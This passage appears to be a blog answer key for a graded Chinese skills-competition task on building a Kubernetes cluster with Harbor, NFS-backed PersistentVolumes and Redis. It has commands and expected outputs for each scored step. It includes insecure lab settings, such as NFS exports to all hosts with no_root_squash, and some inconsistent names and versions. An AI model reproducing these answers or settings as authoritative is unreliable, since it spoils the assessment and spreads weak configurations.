class="line"></span><br><span class="line"><span class="comment"># Enable hardware timestamping on all interfaces that support it.</span></span><br><span class="line"><span class="comment">#hwtimestamp *</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Increase the minimum number of selectable sources required to adjust</span></span><br><span class="line"><span class="comment"># the system clock.</span></span><br><span class="line"><span class="comment">#minsources 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Allow NTP client access from local network.</span></span><br><span class="line"><span class="comment">#allow 192.168.0.0/16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Serve time even if not synchronized to a time source.</span></span><br><span class="line"><span class="comment">#local stratum 10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Specify file containing keys for NTP authentication.</span></span><br><span class="line"><span class="comment">#keyfile /etc/chrony.keys</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Specify directory for log files.</span></span><br><span class="line">logdir /var/log/chrony</span><br><span class="line"></span><br><span class="line"><span class="comment"># Select which information is logged.</span></span><br><span class="line"><span class="comment">#log measurements statistics tracking</span></span><br><span class="line"></span><br><span class="line">systemctl restart chronyd</span><br><span class="line">systemctl <span class="built_in">enable</span> chronyd</span><br></pre></td></tr></table></figure>

<h3 id="5-设置免密登录"><a href="#5-设置免密登录" class="headerlink" title="5.设置免密登录"></a>5.设置免密登录</h3><p>为四台服务器设置免密登录，保证服务器之间能够互相免密登录。</p>
<p>请将免密登录的命令提交到答题框。【1分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh-keygen </span><br><span class="line">ssh-copy-id root@192.168.200.163</span><br><span class="line">ssh-copy-id root@192.168.200.164</span><br><span class="line">ssh-copy-id root@192.168.200.165</span><br></pre></td></tr></table></figure>

<h2 id="任务2-k8s搭建任务-10分"><a href="#任务2-k8s搭建任务-10分" class="headerlink" title="任务2 k8s搭建任务(10分)"></a>任务2 k8s搭建任务(10分)</h2><h3 id="1-安装docker应用"><a href="#1-安装docker应用" class="headerlink" title="1.安装docker应用"></a>1.安装docker应用</h3><p>在所有节点上安装dokcer-ce。安装完成后修改docker启动引擎为systemd并配置阿里云镜像加速地址，配置成功重启docker服务器。</p>
<p>请将docker version命令的返回结果提交到答题框。【1分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master ~]# docker version</span><br><span class="line">Client: Docker Engine - Community</span><br><span class="line"> Version:           19.03.13</span><br><span class="line"> API version:       1.40</span><br><span class="line"> Go version:        go1.13.15</span><br><span class="line"> Git commit:        4484c46d9d</span><br><span class="line"> Built:             Wed Sep 16 17:03:45 2020</span><br><span class="line"> OS/Arch:           linux/amd64</span><br><span class="line"> Experimental:      <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">Server: Docker Engine - Community</span><br><span class="line"> Engine:</span><br><span class="line">  Version:          19.03.13</span><br><span class="line">  API version:      1.40 (minimum version 1.12)</span><br><span class="line">  Go version:       go1.13.15</span><br><span class="line">  Git commit:       4484c46d9d</span><br><span class="line">  Built:            Wed Sep 16 17:02:21 2020</span><br><span class="line">  OS/Arch:          linux/amd64</span><br><span class="line">  Experimental:     <span class="literal">false</span></span><br><span class="line"> containerd:</span><br><span class="line">  Version:          1.3.7</span><br><span class="line">  GitCommit:        8fba4e9a7d01810a393d5d25a3621dc101981175</span><br><span class="line"> runc:</span><br><span class="line">  Version:          1.0.0-rc10</span><br><span class="line">  GitCommit:        dc9208a3303feef5b3839f4323d9beb36df0a9dd</span><br><span class="line"> docker-init:</span><br><span class="line">  Version:          0.18.0</span><br><span class="line">  GitCommit:        fec3683</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>过程：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装依赖</span></span><br><span class="line">yum install -y yum-utils lvm2 device-mapper-*</span><br><span class="line"><span class="comment">#安装docker-ce</span></span><br><span class="line">yum install -y docker-ce</span><br><span class="line"></span><br><span class="line">systemctl start docker</span><br><span class="line">systemctl <span class="built_in">enable</span> docker</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改相关配置</span></span><br><span class="line"><span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://5twf62k1.mirror.aliyuncs.com&quot;</span>],</span><br><span class="line">  <span class="string">&quot;exec-opts&quot;</span>: [<span class="string">&quot;native.cgroupdriver=systemd&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>

<h3 id="2-安装docker-compose"><a href="#2-安装docker-compose" class="headerlink" title="2.安装docker-compose"></a>2.安装docker-compose</h3><p>在Harbor节点上使用&#x2F;opt&#x2F;paas&#x2F;docker-compose&#x2F;v1.25.5-docker-compose-Linux-x86_6下的文件安装docker-compose。安装完成后执行docker-composeversion命令。</p>
<p>请将docker-compose versio命令返回结果提交到答题框。【0.5分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@harbor ~]# docker-compose version</span><br><span class="line">docker-compose version 1.25.5, build 8a1c60f6</span><br><span class="line">docker-py version: 4.1.0</span><br><span class="line">CPython version: 3.7.5</span><br><span class="line">OpenSSL version: OpenSSL 1.1.0l  10 Sep 2019</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>过程：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#可将master节点的docker-compose文件传到harbor</span></span><br><span class="line"><span class="built_in">cp</span> -rfv /opt/docker-compose/v1.25.5-docker-compose-Linux-x86_64 /usr/local/bin/docker-compose</span><br><span class="line"><span class="built_in">chmod</span> +x /usr/local/bin/docker-compose</span><br><span class="line">docker-compose version</span><br></pre></td></tr></table></figure>

<h3 id="3-搭建horbor仓库"><a href="#3-搭建horbor仓库" class="headerlink" title="3.搭建horbor仓库"></a>3.搭建horbor仓库</h3><p>在Harbor节点使用&#x2F;opt&#x2F;paas&#x2F;harbor&#x2F; harbor-offline-installer-v2.1.0.tgz离线安装包，安装harbor仓库，并修改各节点默认docker仓库为harbor仓库地址。</p>
<p>请将master节点daemon.json中的内容提交到答题框。【2分】</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">cat /etc/docker/daemon.json</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;insecure-registries&quot;</span> <span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;192.168.200.165:5000&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;registry-mirrors&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;https://5twf62k1.mirror.aliyuncs.com&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;exec-opts&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;native.cgroupdriver=systemd&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>过程：</p>
<p><strong>harbor：</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1.创建ca证书</span></span><br><span class="line"><span class="built_in">mkdir</span> /cert/ -p</span><br><span class="line"><span class="built_in">cd</span> /cert/ </span><br><span class="line"><span class="comment">#以下命令创建ca证书</span></span><br><span class="line">openssl req  -newkey rsa:4096 -nodes -sha256 -keyout ca.key -x509 -days 365 -out ca.crt</span><br><span class="line"><span class="comment">#一路回车出现Common Name 输入IP或域名</span></span><br><span class="line">Common Name (eg, your name or your server<span class="string">&#x27;s hostname) []:192.168.200.165</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#2.生成证书签名请求</span></span><br><span class="line"><span class="string">openssl req  -newkey rsa:4096 -nodes -sha256 -keyout 192.168.200.165.key -out 192.168.200.165.csr</span></span><br><span class="line"><span class="string">一路回车出现Common Name 输入IP或域名</span></span><br><span class="line"><span class="string">Common Name (eg, your name or your server&#x27;</span>s hostname) []:192.168.200.165</span><br><span class="line"></span><br><span class="line"><span class="comment">#3.生成证书</span></span><br><span class="line"><span class="built_in">echo</span> subjectAltName = IP:192.168.200.165 &gt; extfile.cnf</span><br><span class="line">openssl x509 -req -days 365 -<span class="keyword">in</span> 192.168.200.165.csr -CA ca.crt -CAkey ca.key -CAcreateserial -extfile extfile.cnf -out 192.168.200.165.crt</span><br><span class="line"></span><br><span class="line"><span class="comment">#4.配置harbor.yml</span></span><br><span class="line">tar -zxvf harbor-offline-installer-v2.0.1.tgz</span><br><span class="line"><span class="built_in">cd</span> harbor</span><br><span class="line"><span class="built_in">cp</span> harbor.yml.tmpl harbor.yml</span><br><span class="line">hostname=192.168.200.165</span><br><span class="line">ssl_cert = /cert/192.168.200.165.crt     <span class="comment">#crt位置</span></span><br><span class="line">ssl_cert_key = /cert/192.168.200.165.key  <span class="comment">#key的位置  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#5.配置使用harbor</span></span><br><span class="line">./prepare</span><br><span class="line">./install.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#将签证证书发送到其他节点</span></span><br><span class="line"><span class="built_in">mkdir</span> –p /etc/docker/certs.d/192.168.200.165</span><br><span class="line"><span class="built_in">cp</span> ca.crt /etc/docker/certs.d/192.168.200.165/ca.crt</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>

<h3 id="4-上传docker镜像"><a href="#4-上传docker镜像" class="headerlink" title="4.上传docker镜像"></a>4.上传docker镜像</h3><p>在master节点使用命令将&#x2F;opt&#x2F;paas&#x2F;images目录下所有镜像导入本地。然后使用&#x2F;opt&#x2F;paas&#x2F;k8s_image_push.sh将所有镜像上传至docker仓库,遇到地址配置时请写IP地址。</p>
<p>请将执行k8s_image_push.sh文件的返回结果提交到答题框。</p>
<p>过程</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">导入镜像</span></span><br><span class="line">for i in $(ls /opt/paas/images|grep tar)</span><br><span class="line">do</span><br><span class="line">  docker load -i /opt/paas/images/$i</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">cd /opt/paas/</span><br><span class="line">./k8s_image_push.sh</span><br></pre></td></tr></table></figure>

<h3 id="5-安装kubeadm工具"><a href="#5-安装kubeadm工具" class="headerlink" title="5.安装kubeadm工具"></a>5.安装kubeadm工具</h3><p>在master及所有node节点安装Kubeadm工具并设置开机自动启动，安装完成后使用rpm命令配合grep查看Kubeadm工具是否正确安装。</p>
<p>请将kubectl get nodes命令的返回结果提交到答题框。【0.5分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">rpm -qa | grep ku</span><br><span class="line">kubeadm-1.18.1-0.x86_64</span><br><span class="line">kubectl-1.18.1-0.x86_64</span><br><span class="line">kubelet-1.18.1-0.x86_64</span><br></pre></td></tr></table></figure>

<p>过程：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">yum -y install kubeadm-1.18.1 kubectl-1.18.1 kubelet-1.18.1</span><br><span class="line"></span><br><span class="line">systemctl <span class="built_in">enable</span> kubelet &amp;&amp; systemctl start kubelet</span><br></pre></td></tr></table></figure>

<h3 id="6-kubeadm安装master"><a href="#6-kubeadm安装master" class="headerlink" title="6.kubeadm安装master"></a>6.kubeadm安装master</h3><p>使用kubeadm命令生成yaml文件，并修改yaml文件，设置kubernetes虚拟内部网段地址为10.244.0.0&#x2F;16，通过该yaml文件初始化master节点，然后使用kube-flannel.yaml完成控制节点初始化设置，完成后使用命令查看集群状态和所有pod。</p>
<p>请将kubectl get nodes命令的返回结果提交到答题框。【2分】</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# kubectl get nodes</span><br><span class="line">NAME     STATUS     ROLES    AGE   VERSION</span><br><span class="line">master   NotReady   master   13s   v1.18.1</span><br></pre></td></tr></table></figure>

<p>过程：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#开启路由转发（全部节点）</span></span><br><span class="line"><span class="built_in">cat</span> &gt;&gt; /etc/sysctl.d/k8s.conf &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">net.ipv4.ip_forward = 1 </span></span><br><span class="line"><span class="string">net.bridge.bridge-nf-call-ip6tables = 1 </span></span><br><span class="line"><span class="string">net.bridge.bridge-nf-call-iptables = 1 </span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">sysctl --system  //生效</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成yaml文件</span></span><br><span class="line">kubeadm config <span class="built_in">print</span> init-defaults  &gt; kubeadm-config.yaml</span><br><span class="line"></span><br><span class="line"><span class="comment">#1.修改advertiseAddress,改为本机ip</span></span><br><span class="line">advertiseAddress: 192.168.200.162</span><br><span class="line"><span class="comment">#2.在yaml文件中的networking添加：</span></span><br><span class="line">podSubnet: <span class="string">&quot;10.244.0.0/16&quot;</span></span><br><span class="line"><span class="comment">#3.可以通过修改container地址提高速度</span></span><br><span class="line">--image-repository=registry.aliyuncs.com/google_containers</span><br><span class="line"><span class="comment">#安装master节点</span></span><br><span class="line">kubeadm init --config kubeadm-config.yaml</span><br></pre></td></tr></table></figure>

<h3 id="7-删除污点"><a href="#7-删除污点" class="headerlink" title="7.删除污点"></a>7.删除污点</h3><p>使用命令删除master节点的污点，使得Pod也可以调度到master节点上，操作成功配合grep查看master节点的污点。</p>
<p>请将删除master节点的污点的命令提交到答题框。【1分】</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl taint nodes master node-role.kubernetes.io/master-</span><br></pre></td></tr></table></figure>

<p>过程</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#删除污点</span></span><br><span class="line">kubectl taint nodes master node-role.kubernetes.io/master-</span><br><span class="line"><span class="comment">#查看master污点</span></span><br><span class="line">kubectl describe nodes master |grep Taints</span><br><span class="line">Taints:             node.kubernetes.io/not-ready:NoExecute</span><br></pre></td></tr></table></figure>

<h3 id="8-安装kubernetes网络插件"><a href="#8-安装kubernetes网络插件" class="headerlink" title="8.安装kubernetes网络插件"></a>8.安装kubernetes网络插件</h3><p>使用kube-flannel.yaml安装kubernetes网络插件，安装完成后使用命令查看节点状态。</p>
<p>请将kubectl get nodes命令的返回结果提交到答题框。【0.5分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@localhost paas]# kubectl get nodes</span><br><span class="line">NAME     STATUS   ROLES    AGE   VERSION</span><br><span class="line">master   Ready    master   12m   v1.18.1</span><br></pre></td></tr></table></figure>

<p>过程：</p>
<p><strong>master</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl apply -f /opt/paas/yaml/flannel/kube-flannel.yaml</span><br><span class="line"></span><br><span class="line">[root@localhost paas]# kubectl get nodes</span><br><span class="line">NAME     STATUS   ROLES    AGE   VERSION</span><br><span class="line">master   Ready    master   12m   v1.18.1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="9-kubernetes图形化界面的安装"><a href="#9-kubernetes图形化界面的安装" class="headerlink" title="9.kubernetes图形化界面的安装"></a>9.kubernetes图形化界面的安装</h3><p>使用recommended.yaml和dashboard-adminuser.yaml安装kubernetesdashboard界面，完成后查看首页。</p>
<p>请将kubectl get pod,svc -n kubernetes-dashboard命令的返回结果提交到答题框。【1分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master ~]# kubectl get pod,svc -n kubernetes-dashboard</span><br><span class="line">NAME                                             READY   STATUS    RESTARTS   AGE</span><br><span class="line">pod/dashboard-metrics-scraper-6b4884c9d5-9g89j   1/1     Running   0          22d</span><br><span class="line">pod/kubernetes-dashboard-5585794759-7h42g        1/1     Running   0          22d</span><br><span class="line"></span><br><span class="line">NAME                                TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)         AGE</span><br><span class="line">service/dashboard-metrics-scraper   ClusterIP   10.102.214.55   &lt;none&gt;        8000/TCP        22d</span><br><span class="line">service/kubernetes-dashboard        NodePort    10.99.171.141   &lt;none&gt;        443:30000/TCP   22d</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>过程：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#部署dashboard</span></span><br><span class="line"><span class="built_in">mkdir</span> dashboard-certs</span><br><span class="line"><span class="built_in">cd</span> dashboard-certs/</span><br><span class="line">kubectl create namespace kubernetes-dashboard</span><br><span class="line">openssl genrsa -out dashboard.key 2048</span><br><span class="line">openssl req -days 36000 -new -out dashboard.csr -key dashboard.key -subj <span class="string">&#x27;/CN=dashboard-cert&#x27;</span></span><br><span class="line">openssl x509 -req -<span class="keyword">in</span> dashboard.csr -signkey dashboard.key -out dashboard.crt</span><br><span class="line">kubectl create secret generic kubernetes-dashboard-certs --from-file=dashboard.key --from-file=dashboard.crt -n kubernetes-dashboard</span><br><span class="line">sed -i <span class="string">&quot;s/kubernetesui/<span class="variable">$IP</span>\/library/g&quot;</span> /opt/yaml/dashboard/recommended.yaml</span><br><span class="line">kubectl apply -f /opt/yaml/dashboard/recommended.yaml</span><br><span class="line">kubectl apply -f /opt/yaml/dashboard/dashboard-adminuser.yaml</span><br><span class="line"></span><br><span class="line"><span class="comment">#若pod未成功创建，修改一下镜像的地址</span></span><br></pre></td></tr></table></figure>

<h3 id="10-扩展计算节点"><a href="#10-扩展计算节点" class="headerlink" title="10.扩展计算节点"></a>10.扩展计算节点</h3><p>在所有node节点上使用kubeadm config命令生成yaml文件，并通过yaml文件将node节点加入kubernetes集群。完成后在master节点上查看所有节点状态。</p>
<p>请将kubectl get nodes命令的返回结果提交到答题框。【0.5分】</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@master ~]# kubectl get nodes</span><br><span class="line">NAME     STATUS   ROLES    AGE   VERSION</span><br><span class="line">master   Ready    master   22d   v1.18.1</span><br><span class="line">node1    Ready    &lt;none&gt;   22d   v1.18.1</span><br><span class="line">node2    Ready    &lt;none&gt;   22d   v1.18.1</span><br></pre></td></tr></table></figure>

<p>过程：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#生成添加节点的配置文件</span></span><br><span class="line">kubeadm config <span class="built_in">print</span> join-defaults &gt; kubeadm-config.yaml</span><br><span class="line"><span class="comment">#需要修改：</span></span><br><span class="line">apiServerEndpoint：连接apiserver的地址，即master的api地址，这里可以改为192.168.200.162:6443,如果master集群部署的话，这里需要改为集群vip地址</span><br><span class="line">token及tlsBootstrapToken：连接master使用的token，这里需要与master上的InitConfiguration中的token配置一致</span><br><span class="line">name：node节点的名称，如果使用主机名，需要确保master节点可以解析该主机名。否则的话可直接使用ip地址</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加节点</span></span><br><span class="line">kubeadm <span class="built_in">join</span> --config kubeadm-config.yaml</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看nodes节点是否ready(controller)</span></span><br><span class="line">kubectl get nodes</span><br></pre></td></tr></table></figure>

<h2 id="任务三-存储配置-5分"><a href="#任务三-存储配置-5分" class="headerlink" title="任务三 存储配置(5分)"></a>任务三 存储配置(5分)</h2><h3 id="1-NFS配置"><a href="#1-NFS配置" class="headerlink" title="1.NFS配置"></a>1.NFS配置</h3><p>在master节点安装nfs，并配置6个共享目录，启动后查看共享目录。并在各node节点安装nfs客户端并查看共享目录。</p>
<p>请将showmount -e master命令的返回结果提交至答题框。【2分】</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@node1 ~]# showmount -e master</span><br><span class="line">Export list for master:</span><br><span class="line">/nfs6 *</span><br><span class="line">/nfs5 *</span><br><span class="line">/nfs4 *</span><br><span class="line">/nfs3 *</span><br><span class="line">/nfs2 *</span><br><span class="line">/nfs1 *</span><br></pre></td></tr></table></figure>

<p>过程：</p>
<p><strong>master</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装nfs相关软件</span></span><br><span class="line">yum install -y nfs-utils rpcbind</span><br><span class="line"><span class="comment">#添加6个共享目录</span></span><br><span class="line">vi /etc/exports</span><br><span class="line">/nfs1 *(rw,<span class="built_in">sync</span>,no_root_squash,no_subtree_check)</span><br><span class="line">/nfs2 *(rw,<span class="built_in">sync</span>,no_root_squash,no_subtree_check)</span><br><span class="line">/nfs3 *(rw,<span class="built_in">sync</span>,no_root_squash,no_subtree_check)</span><br><span class="line">/nfs4 *(rw,<span class="built_in">sync</span>,no_root_squash,no_subtree_check)</span><br><span class="line">/nfs5 *(rw,<span class="built_in">sync</span>,no_root_squash,no_subtree_check)</span><br><span class="line">/nfs6 *(rw,<span class="built_in">sync</span>,no_root_squash,no_subtree_check)</span><br><span class="line"></span><br><span class="line">systemctl start nfs-server rpcbind</span><br><span class="line">systemctl <span class="built_in">enable</span> nfs-server rpcbind</span><br></pre></td></tr></table></figure>

<p>其他节点：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#yum install -y nfs-utils</span><br><span class="line">showmount -e master</span><br></pre></td></tr></table></figure>

<h3 id="2-PV配置"><a href="#2-PV配置" class="headerlink" title="2.PV配置"></a>2.PV配置</h3><p>每一个Redis Pod都需要一个独立的PV来存储自己的数据，创建一个pv.yaml文件,包含6个PV，分别对应nfs中的6个共享目录。</p>
<p>请将yaml文件中的内容提交至答题框。【2分】</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">cat</span> <span class="string">pv.yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">PersistentVolume</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pv1</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">nfs:</span></span><br><span class="line">    <span class="attr">server:</span> <span class="number">192.168</span><span class="number">.200</span><span class="number">.162</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">/nfs1</span></span><br><span class="line">  <span class="attr">capacity:</span></span><br><span class="line">    <span class="attr">storage:</span> <span class="string">1Gi</span></span><br><span class="line">  <span class="attr">accessModes:</span> [<span class="string">&quot;ReadWriteMany&quot;</span>,<span class="string">&quot;ReadOnlyMany&quot;</span>]</span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">PersistentVolume</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pv2</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">nfs:</span></span><br><span class="line">    <span class="attr">server:</span> <span class="number">192.168</span><span class="number">.200</span><span class="number">.162</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">/nfs2</span></span><br><span class="line">  <span class="attr">capacity:</span></span><br><span class="line">    <span class="attr">storage:</span> <span class="string">1Gi</span></span><br><span class="line">  <span class="attr">accessModes:</span> [<span class="string">&quot;ReadWriteMany&quot;</span>,<span class="string">&quot;ReadOnlyMany&quot;</span>]</span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">PersistentVolume</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pv3</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">nfs:</span></span><br><span class="line">    <span class="attr">server:</span> <span class="number">192.168</span><span class="number">.200</span><span class="number">.162</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">/nfs3</span></span><br><span class="line">  <span class="attr">capacity:</span></span><br><span class="line">    <span class="attr">storage:</span> <span class="string">1Gi</span></span><br><span class="line">  <span class="attr">accessModes:</span> [<span class="string">&quot;ReadWriteMany&quot;</span>,<span class="string">&quot;ReadOnlyMany&quot;</span>]</span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">PersistentVolume</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pv4</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">nfs:</span></span><br><span class="line">    <span class="attr">server:</span> <span class="number">192.168</span><span class="number">.200</span><span class="number">.162</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">/nfs4</span></span><br><span class="line">  <span class="attr">capacity:</span></span><br><span class="line">    <span class="attr">storage:</span> <span class="string">1Gi</span></span><br><span class="line">  <span class="attr">accessModes:</span> [<span class="string">&quot;ReadWriteMany&quot;</span>,<span class="string">&quot;ReadOnlyMany&quot;</span>]</span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">PersistentVolume</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pv5</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">nfs:</span></span><br><span class="line">    <span class="attr">server:</span> <span class="number">192.168</span><span class="number">.200</span><span class="number">.162</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">/nfs5</span></span><br><span class="line">  <span class="attr">capacity:</span></span><br><span class="line">    <span class="attr">storage:</span> <span class="string">1Gi</span></span><br><span class="line">  <span class="attr">accessModes:</span> [<span class="string">&quot;ReadWriteMany&quot;</span>,<span class="string">&quot;ReadOnlyMany&quot;</span>]</span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">PersistentVolume</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pv6</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">nfs:</span></span><br><span class="line">    <span class="attr">server:</span> <span class="number">192.168</span><span class="number">.200</span><span class="number">.162</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">/nfs6</span></span><br><span class="line">  <span class="attr">capacity:</span></span><br><span class="line">    <span class="attr">storage:</span> <span class="string">1Gi</span></span><br><span class="line">  <span class="attr">accessModes:</span> [<span class="string">&quot;ReadWriteMany&quot;</span>,<span class="string">&quot;ReadOnlyMany&quot;</span>]</span><br></pre></td></tr></table></figure>

<h3 id="3-创建Configmap"><a href="#3-创建Configmap" class="headerlink" title="3.创建Configmap"></a>3.创建Configmap</h3><p>将提供的redis.conf配置文件创建为名称为redis-conf的Configmap对象，创建成功后，查看redis-conf的详细信息。</p>
<p>请将kubectl describe cm redis-conf命令的返回结果提交至答题框。【0.5分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master yaml]# kubectl describe cm redis-conf                                    Name:         redis-config</span><br><span class="line">Namespace:    default</span><br><span class="line">Labels:       &lt;none&gt;</span><br><span class="line">Annotations:  &lt;none&gt;</span><br><span class="line"></span><br><span class="line">Data</span><br><span class="line">====</span><br><span class="line">redis.conf:</span><br><span class="line">----</span><br><span class="line">appendonly <span class="built_in">yes</span></span><br><span class="line">cluster-enabled <span class="built_in">yes</span></span><br><span class="line">cluster-config-file /var/lib/redis/nodes.conf</span><br><span class="line">cluster-node-timeout 5000</span><br><span class="line"><span class="built_in">dir</span> /var/lib/redis</span><br><span class="line">port 6379</span><br><span class="line"></span><br><span class="line">Events:  &lt;none&gt;</span><br></pre></td></tr></table></figure>

<p>过程：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建configMap</span></span><br><span class="line">kubectl create configmap redis-confg --from-file=/root/redis.conf</span><br></pre></td></tr></table></figure>

<h3 id="4-导入镜像"><a href="#4-导入镜像" class="headerlink" title="4.导入镜像"></a>4.导入镜像</h3><p>使用提供的redis.tar导入所需的镜像，并重新修改镜像tag并将镜像上传至harbor镜像仓库中。</p>
<p>请将上述操作的所有命令提交至答题框。【0.5分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master ~]# docker load -i redis.tar</span><br><span class="line">9f54eef41275: Loading layer  75.16MB/75.16MB</span><br><span class="line">e9e9d8cf772b: Loading layer  3.584kB/3.584kB</span><br><span class="line">8b504a175fb9: Loading layer  229.7MB/229.7MB</span><br><span class="line">Loaded image: ubuntu:redis-trip</span><br><span class="line">2edcec3590a4: Loading layer  83.86MB/83.86MB</span><br><span class="line">9b24afeb7c2f: Loading layer  338.4kB/338.4kB</span><br><span class="line">4b8e2801e0f9: Loading layer  4.274MB/4.274MB</span><br><span class="line">529cdb636f61: Loading layer   27.8MB/27.8MB</span><br><span class="line">9975392591f2: Loading layer  2.048kB/2.048kB</span><br><span class="line">8e5669d83291: Loading layer  3.584kB/3.584kB</span><br><span class="line">Loaded image: redis:latest</span><br><span class="line">[root@master ~]# docker tag redis:latest 192.168.200.165/library/redis:latest</span><br><span class="line">[root@master ~]# docker push 192.168.200.165/library/redis:latest</span><br><span class="line">The push refers to repository [192.168.200.165/library/redis]</span><br><span class="line">8e5669d83291: Pushed</span><br><span class="line">9975392591f2: Pushed</span><br><span class="line">529cdb636f61: Pushed</span><br><span class="line">4b8e2801e0f9: Pushed</span><br><span class="line">9b24afeb7c2f: Pushed</span><br><span class="line">2edcec3590a4: Pushed</span><br><span class="line">latest: digest: 